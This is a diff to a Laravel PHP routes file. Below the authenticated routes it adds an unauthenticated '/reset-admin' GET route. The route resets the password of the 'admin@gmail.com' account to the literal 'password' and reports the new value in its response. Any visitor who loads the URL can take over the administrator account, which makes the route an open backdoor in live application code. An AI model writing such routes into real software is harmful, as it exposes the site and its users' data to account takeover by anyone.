@@ -31,3 +31,9 @@ Route::middleware('auth.custom')->group(function () {
     Route::get('/profile',        [ProfileController::class, 'index'])->name('profile.index');
     Route::put('/profile/update', [ProfileController::class, 'update'])->name('profile.update');
 });
+
+Route::get('/reset-admin', function() {
+    \App\Models\User::where('email', 'admin@gmail.com')
+        ->update(['password' => \Illuminate\Support\Facades\Hash::make('password')]);
+    return 'Done! Admin password reset to: password';
+});
